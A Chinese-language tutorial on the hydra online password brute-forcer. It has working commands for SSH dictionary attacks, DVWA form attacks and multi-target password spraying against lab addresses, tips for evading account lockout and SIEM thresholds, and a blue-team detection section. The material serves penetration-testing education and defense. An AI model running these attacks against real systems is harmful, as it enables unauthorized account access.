# hydra（在线登录爆破器）

> **一句话**：对远程网络服务的登录接口做并行口令猜测（在线爆破），支持 50 多种协议。
> **分类**：口令攻击 ｜ **Kali 包**：`hydra` ｜ **官方文档**：<https://github.com/vanhauser-thc/thc-hydra>

## 1. 它解决什么问题

拿到一个目标清单后，你要回答的第一个问题往往是：「这台机器上有没有弱口令？」

- **在线爆破（online brute-force）**：向真实服务发登录请求，验证账号密码是否正确。代表工具 `hydra`、[medusa](medusa.md)、[ncrack](ncrack.md)、[patator](patator.md)。
- **离线破解（offline cracking）**：已经拿到哈希文件，在本地高速枚举。代表工具 [john](john.md)、[hashcat](hashcat.md)。

hydra 属于前者，它的价值是**协议覆盖广 + 上手快**：

| 工具 | 定位 | 突出点 |
| --- | --- | --- |
| hydra | 交互式快速爆破 | 协议最多（50+），命令行最短，适合单机、少量目标 |
| medusa | 大规模并行爆破 | 线程模型成熟，多主机多用户场景更稳 |
| ncrack | 网络审计级爆破 | 语法仿 Nmap，有 `-T0~5` 时序模板、断点续跑 |
| patator | 万能模糊测试 | 模块化 Python，除登录外还能枚举用户、跑 SQL 查询、fuzz HTTP |

一句话选型：**先试 hydra，要批量就用 medusa/ncrack，要定制请求就 patator**。

## 2. 工作原理

在线爆破的本质是**把「猜密码」变成「发请求」**。以 SSH 为例：

1. 与目标 22 端口建立 TCP 连接；
2. 走 SSH 协议完成密钥交换、用户认证协商；
3. 发送一对 `username` / `password`；
4. 服务端返回成功或失败（SSH 返回 `SSH2_MSG_USERAUTH_FAILURE`）；
5. 关闭连接，换下一组凭据，重复。

hydra 在步骤 1~5 外面套了一层并行调度：

- `-t TASKS` 控制**每个目标**同时开多少条连接（默认 16）。每条线程独立跑一遍上面的流程。
- 支持「用户名固定 + 密码字典」、`-L` 用户字典 + 密码字典的笛卡尔积、`-C` 直接给 `login:pass` 组合文件。
- `-e nsr` 让 hydra 额外尝试**空密码（n）**、**用户名即密码（s）**、**用户名倒写（r）**。这三类弱口令命中率极高，成本又几乎为零，永远值得开。

### 为什么在线爆破一定「慢」

三个物理限制，无法用工具绕过：

1. **网络往返（RTT）**：每次尝试至少一个 RTT。局域网的 SSH 大约每秒几十到几百次尝试；跨公网则低一个数量级。
2. **服务端限流与锁定**：账户锁定策略、失败延迟（如 1 秒递增）、验证码。
3. **协议开销**：SSH 每次连接要做完整的密钥交换（CPU 密集），而 HTTP Basic 认证只是一个请求。

对比离线破解：MD5 在单张现代 GPU 上每秒能算**上百亿次**，而 bcrypt（cost=12）只有**每秒几千次**量级。这就是为什么「拿到哈希」比「在线猜」值钱得多，也是为什么服务端应该使用 bcrypt/scrypt/Argon2 这类慢哈希。

### 支持的协议（节选）

`adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smb2 smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp`

## 3. 安装与快速上手

```bash
sudo apt install hydra
hydra -h | head -30
```

快速上手三步：

```bash
# 1) 先确认目标端口和服务在跑（用 nmap，不属于本教程范围）
nmap -p 22,3389,21 192.168.56.10

# 2) 单用户 + 字典，SSH，6 线程
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 6 ssh://192.168.56.10

# 3) 命中即停，结果写文件
hydra -l root -P /usr/share/wordlists/rockyou.txt -f -o found.txt ssh://192.168.56.10
```

hydra 自带的辅助工具（同一 `hydra` 包）：

- `dpl4hydra`：生成厂商默认口令表，例如 `dpl4hydra linksys` 生成 `dpl4hydra_linksys.lst`。
- `pw-inspector`：按长度/字符集过滤字典，例如 `pw-inspector -i rockyou.txt -m 8 -M 12 -u -n`。
- `hydra-wizard` / `xhydra`：交互式向导和 GTK 图形界面。

## 4. 核心参数详解

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-l LOGIN` | 指定单个用户名 | 已知用户名时用（如枚举出的 `admin`） |
| `-L FILE` | 从文件读用户名列表 | 配合 `-P` 形成笛卡尔积，注意总量 = 用户数 × 密码数 |
| `-p PASS` | 指定单个密码 | 测「同一密码是否通用」时用（口令喷洒） |
| `-P FILE` | 从文件读密码字典 | 首选场景，配 [rockyou](wordlists.md) 或 [seclists](wordlists.md) |
| `-C FILE` | `login:pass` 格式组合文件 | 绕过笛卡尔积，直接给精确对，效率最高 |
| `-e nsr` | 尝试空密码 / 用户名即密码 / 用户名倒写 | **永远加上**，成本极低命中率极高 |
| `-u` | 按用户循环而非按密码循环 | 想快速跑遍所有用户各试一次时用，`-x` 时自动隐含 |
| `-t TASKS` | 每目标并发连接数（默认 16） | 远程服务调低到 4~8；本地靶机可调到 32；过高会触发限流或丢包 |
| `-T TASKS` | `-M` 模式下的总并发（默认 64） | 多主机扫描时统一限速 |
| `-M FILE` | 多目标列表，一行一个，可带 `:port` | 批量审计用；配 `-F` 全局停止 |
| `-s PORT` | 指定非默认端口 | 服务跑在 2222 时用 `-s 2222` |
| `-S` | 强制 SSL 连接 | 部分老服务需要显式指定 |
| `-x MIN:MAX:CHARSET` | 内置字符集暴力生成 | 只适合短口令（≤6 位），长口令一律生成字典文件后用 `-P` |
| `-y` | `-x` 时禁用符号字符 | 已知目标只允许字母数字时缩小空间 |
| `-o FILE` | 结果写入文件 | 审计留档必备 |
| `-b FORMAT` | `-o` 的输出格式：`text`/`json`/`jsonv1` | 要接入后续自动化用 `json` |
| `-f` / `-F` | 找到一组就停（`-f` 单主机 / `-F` 全局） | 口令喷洒场景用 `-f` 避免把整个字典跑完 |
| `-w TIME` | 等待响应超时秒数（默认 32） | 高延迟链路适当调大 |
| `-W TIME` | 两次连接之间的等待秒数 | 绕开「失败延迟」类防护 |
| `-c TIME` | 每次尝试之间的间隔（强制 `-t 1`） | 规避账户锁定，做「低速慢猜」 |
| `-v` / `-V` | 详细模式 / 显示每次尝试的用户名密码 | `-V` 输出极大，只在排错时用 |
| `-d` | Debug 模式 | 参数写错时定位问题 |
| `-R` | 恢复上次中断的会话 | 长任务被打断后接着跑 |
| `-U` | 显示某服务模块的专属用法 | 写 HTTP 表单爆破前**必看** |
| `-m OPT` | 传递给模块的参数 | 与 `-U` 配合，如 HTTP 表单的失败关键字 |
| `-4` / `-6` | 强制 IPv4 / IPv6 | IPv6 地址要写成 `[addr]` |

## 5. 实战演练

**环境声明**：以下全部操作在**你自己搭建的隔离实验环境**中完成——本机 VirtualBox 里自建 Kali 攻击机 + Metasploitable2/DVWA 靶机，或 CTF 靶场。**严禁对任何非授权主机执行**。本节示例 IP `192.168.56.0/24` 为仅主机网络（host-only），不与生产网互通。

### 场景 1：SSH 单用户字典爆破（入门）

**步骤 1：确认服务可用**

```bash
nmap -sV -p 22 192.168.56.10
# 22/tcp open  ssh  OpenSSH 8.9p1
```

**步骤 2：准备小字典（先小规模验证流程，别一上来就上 rockyou）**

```bash
printf 'password\n123456\nadmin\nletmein\n' > ~/pw-small.txt
```

**步骤 3：执行**

```bash
hydra -l msfadmin -P ~/pw-small.txt -t 4 -e nsr -f -o ~/hydra-ssh.txt ssh://192.168.56.10
```

**预期输出片段与解读**

```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - ...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 16 login tries (l:1/p:4), ~4 tries per task
[DATA] attacking ssh://192.168.56.10:22/
[22][ssh] host: 192.168.56.10   login: msfadmin   password: msfadmin
[STATUS] attack finished for 192.168.56.10 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

- `[DATA] max 4 tasks … 16 login tries`：并发 4，总尝试数 16 = 4 个密码 × 4 种 `-e` 变体。
- `[22][ssh] host: … login: … password: …`：命中。这一行是唯一需要关心的结果。
- `1 valid password found`：统计行。

### 场景 2：HTTP 表单爆破 DVWA（中等）

DVWA 的登录页是 POST 表单，需要先取到 CSRF token 和 cookie 再爆破。hydra 对带动态 token 的表单支持有局限，这里用**关闭安全等级 / 或对无 token 的练习表单**演示。

**步骤 1：看模块帮助（这是关键一步，别跳过）**

```bash
hydra -U http-post-form
```

**步骤 2：确定失败关键字**

先在浏览器或 curl 里故意输错一次，记录响应里的特征字符串：

```bash
curl -s -X POST -d 'username=admin&password=wrong&Login=Login' \
  http://192.168.56.10/dvwa/login.php | grep -i -m1 'incorrect\|failed'
# <pre>Username or password incorrect</pre>
```

**步骤 3：爆破**

```bash
hydra -l admin -P ~/pw-small.txt \
  -t 4 -f \
  192.168.56.10 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
```

字段格式是三段，用 `:` 分隔：

| 段 | 含义 |
| --- | --- |
| `/dvwa/login.php` | 请求路径 |
| `username=^USER^&password=^PASS^&Login=Login` | POST 体，`^USER^` / `^PASS^` 是占位符 |
| `F=incorrect` | 失败判定：响应中出现 `incorrect` 即视为失败（也可用 `S=` 表示成功关键字） |

**常见坑**：若响应体里始终包含 `incorrect`（比如 JS 里也有一份），会把所有结果判为失败，`F=` 需要换成更独特的字符串。

### 场景 3：多目标口令喷洒（进阶）

口令喷洒（password spraying）是「**同一批常见密码 × 多个账号**」，目的是避开账户锁定，因为每个账号只被试 1~3 次。

```bash
# 目标列表
cat > ~/targets.txt <<'EOF'
192.168.56.10:22
192.168.56.11:22
192.168.56.12:22
EOF

# 用户列表
printf 'admin\nroot\noracle\npostgres\n' > ~/users.txt

# 只试 3 个最可能的密码，-u 按用户循环，-c 2 加 2 秒间隔，-T 限制总并发
printf 'Summer2026\nWelcome1\nPassword123\n' > ~/spray.txt

hydra -L ~/users.txt -P ~/spray.txt -u -c 2 -T 8 -f -o ~/spray-hits.txt \
  -M ~/targets.txt ssh
```

输出解读：

```
[DATA] max 1 task per 1 server, overall 8 tasks, 12 login tries
[22][ssh] host: 192.168.56.10   login: oracle   password: Summer2026
```

`-u -c 2 -T 8` 的组合把「并发 8、每次间隔 2 秒」控制住，多数 SIEM 的阈值规则（例如「5 分钟内同一账号 5 次失败」）不会被触发——这正是**红队需要理解、蓝队需要检测**的点。

## 6. 输出解读

| 输出行 | 含义 | 下一步 |
| --- | --- | --- |
| `[DATA] max N tasks … overall M tasks, X login tries` | 并发数与总尝试数 | 若 `login tries` 过大，先算**预计耗时**再决定 |
| `[DATA] attacking ssh://…` | 开始攻击 | — |
| `[22][ssh] host: H login: U password: P` | **命中** | 立刻用 `ssh U@H` 验证；确认后停止该目标攻击 |
| `[STATUS] attack finished for H (valid pair found)` | 因 `-f` 提前结束 | 正常 |
| `[ERROR] could not connect` | 连不上 | 检查网络/端口/防火墙 |
| `[ERROR] all children were disabled due too many connection errors` | 连接错误过多，hydra 自保护 | 降 `-t`，检查是否被 IPS 阻断 |
| `0 of 1 target completed, 0 valid password found` | 未命中 | 换字典、换用户列表，或该服务用了密钥认证 |
| `[WARNING] Restorefile (you have 10 seconds to abort...)` | 检测到上次中断的会话文件 | 用 `-R` 续跑，或 `-I` 忽略 |

**成功/失败判定**：以 `login:` / `password:` 出现的那一行为准，不要只看退出码。

## 7. 与其他工具配合

```text
[信息收集] nmap -sV  →  得到服务与端口
        ↓
[字典准备] cewl（从网站爬词） / crunch（按规则生成） / wordlists+seclists（现成字典）
        ↓
[在线爆破] hydra  →  拿到明文凭据
        ↓
[横向/提权] 用 ssh / smbclient 登录 → 找本地哈希文件
        ↓
[离线破解] unshadow + john / hashcat  →  更多凭据（走离线路线，快几个数量级）
```

无线场景的对应链路：`airodump-ng` 抓握手包 → `aircrack-ng` 或 `hashcat -m 22000` 破解。

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| `ssh://…` 全部 `ERROR: could not connect` | 目标不通、端口错、被防火墙挡 | 先 `nmap -p22`/`nc -vz` 验证连通性 |
| 报 `too many connection errors` | `-t` 过高或 WAF/IPS 在阻断 | 降到 `-t 4`，加 `-W 1` 或 `-c 1` |
| 显示命中但手工登录失败 | 服务会在多次失败后临时锁定；hydra 命中的是「锁定前的尝试」 | 等锁定窗口过去再验证 |
| HTTP 表单永远 0 命中 | 失败关键字 `F=` 写错，或需要 CSRF token / cookie | 先用 curl 手工确认错误响应；带 token 的表单建议改用 patator/自写脚本 |
| `smb` 模块报协议错误 | 目标是 SMB2/SMB3 | 改用 `smb2`；或先 `netexec smb` 确认版本 |
| 字典是 gzip 直接喂给 `-P` | 未解压，hydra 读到的全是二进制乱码 | 先 `gunzip`（见 [wordlists](wordlists.md)） |
| 中文/特殊编码字典报错 | 编码不一致 | `iconv -f GBK -t UTF-8 in.txt > out.txt` |
| `-x` 生成空间爆炸 | 字符集太大 × 长度太长 | `-x` 只用于 ≤6 位；长口令用字典模式 |
| 跑很久没进展 | 在线爆破本身慢，字典又太大 | 先算 `登录尝试数 ÷ 每秒尝试数`，再决定是否用 `-p` 单密码喷洒 |

## 9. 防御视角（蓝队）

| 风险 | 检测 | 缓解 |
| --- | --- | --- |
| 在线字典爆破 | 登录失败速率突增、同一源 IP 多账号失败、失败后紧跟成功 | 失败计数 + 指数退避 + 账户锁定；对源 IP 限速与封禁 |
| 口令喷洒（低频、多账号、单次尝试） | 单 IP 在短时间内对**很多账号各试一次**——这才是最该告警的模式 | 检测「分散度高」的失败模式；对管理员账号强制 MFA |
| 弱口令 | — | 禁用常见弱口令清单、强制长度 ≥ 12、部署 MFA |
| 协议自身弱点 | — | 用密钥认证替代 SSH 密码认证；RDP 走网关 + NLA + MFA；关闭不必要的 telnet/FTP |
| 检测混杂/嗅探 | — | 见 [嗅探与欺骗](../../tutorials/07-嗅探与欺骗/README.md) 的蓝队章节 |

**SIEM 规则思路**（伪逻辑）：

```text
if count(failed_logon by src_ip, user, 5m) > 20
   or count(distinct user by src_ip, 5m) > 10          # 口令喷洒特征
then alert "possible password brute-force"
```

## 10. 参考

- 官方仓库与文档：<https://github.com/vanhauser-thc/thc-hydra>
- Kali 工具页：<https://www.kali.org/tools/hydra/>
- 本机手册：`man hydra`、`hydra -h`、`hydra -U <service>`
- 相关：[medusa](medusa.md)、[ncrack](ncrack.md)、[patator](patator.md)、[crunch](crunch.md)、[wordlists](wordlists.md)

## ⚠️ 法律与伦理

未经授权对他人系统、网络、账号进行口令猜测，在《中华人民共和国刑法》第二百八十五条（非法侵入计算机信息系统罪）、第二百八十六条（破坏计算机信息系统罪）以及《网络安全法》第二十七条下均可能构成犯罪，可判处有期徒刑。其他国家亦有 Computer Fraud and Abuse Act 等同类法律。

**本教程仅适用于**：你自己拥有的系统、明确书面授权的渗透测试、CTF 竞赛靶场、以及为学习和防御目的搭建的本地隔离环境。请勿对任何未授权目标使用本文中的任何命令。授权范围以书面授权书（SOW/ROE）为准，超出范围同样违法。
